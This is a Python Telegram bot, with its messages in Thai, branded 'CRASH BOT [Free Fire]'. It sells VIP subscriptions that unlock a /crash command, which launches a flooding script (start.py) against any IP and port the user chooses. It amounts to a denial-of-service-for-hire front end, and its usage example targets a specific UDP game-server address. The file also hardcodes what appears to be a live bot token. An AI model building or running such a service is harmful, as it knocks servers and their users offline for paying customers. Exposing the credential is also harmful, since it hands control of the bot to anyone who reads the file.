import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ตั้งค่าข้อมูลบอทและแอดมิน
BOT_TOKEN = "7929038707:AAHq52QK_p2TLxSPF4f-Q51Fb8oV1uIM9qc"
ADMIN_ID = 7520172820
START_PY_PATH = "start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

# เชื่อมต่อฐานข้อมูล SQLite
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()

# คำสั่ง /start
@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *แพ็คเกจ VIP ของคุณหมดอายุแล้ว!*"
        else:
            days_remaining = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ *ลูกค้า VIP!*\n"
                f"⏳ *วันคงเหลือ:* {days_remaining} วัน\n"
                f"📅 *หมดอายุ:* {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *คุณไม่มีแพ็คเกจ VIP ที่ใช้งานอยู่!*"

    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 ติดต่อผู้ดูแล 💻",
        url=f"tg://user?id={ADMIN_ID}"
    )
    markup.add(button)

    bot.reply_to(
        message,
        (
            "🤖 *ยินดีต้อนรับสู่ CRASH BOT [Free Fire]!*"
            f"""
{vip_status}
\n"""
            "📌 *วิธีใช้งาน:*"
            """
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>
\n"""
 "💡 *ตัวอย่าง:*"
            """
/crash UDP 143.92.125.230:10013 10 900
\n"""
            "💠 KrizzZModz 🇵🇪 USERS VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

# คำสั่ง /vip (เพิ่ม VIP)
@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ คุณไม่มีสิทธิ์เพิ่ม VIP!")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ รูปแบบไม่ถูกต้อง! ใช้: /vip <ID> <จำนวนวัน>",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ เพิ่ม {telegram_id} เป็น VIP เป็นเวลา {days} วันเรียบร้อยแล้ว!")

# คำสั่ง /crash (เริ่มการโจมตี)
@bot.message_handler(commands=["crash"])
def handle_crash(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้!")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ แพ็คเกจ VIP ของคุณหมดอายุแล้ว!")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ โปรดรอ 10 วินาทีก่อนเริ่มการโจมตีใหม่!")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *รูปแบบคำสั่งไม่ถูกต้อง!*\n\n"
                "📌 *รูปแบบที่ถูกต้อง:*\n"
                "/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\n"
                "💡 *ตัวอย่าง:*\n"
                "/crash UDP 143.92.125.230:10013 10 900"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ หยุดการโจมตี", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] การโจมตีเริ่มต้นแล้ว! [✅]*\n\n"
            f"🌐 *เป้าหมาย:* {ip_port}\n"
            f"⚙️ *ประเภท:* {attack_type}\n"
            f"🧟‍♀️ *เธรด:* {threads}\n"
            f"⏳ *ระยะเวลา (ms):* {duration}\n\n"
            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

# ปุ่มหยุดการโจมตี
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(call.id, "❌ คุณไม่มีสิทธิ์หยุดการโจมตีของผู้อื่น!")
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ หยุดการโจมตีเรียบร้อยแล้ว!")
        bot.edit_message_text(
            "*[⛔] การโจมตีหยุดแล้ว! [⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ ไม่พบการโจมตีใดๆ ที่กำลังทำงานอยู่!")

if __name__ == "__main__":
    bot.infinity_polling()
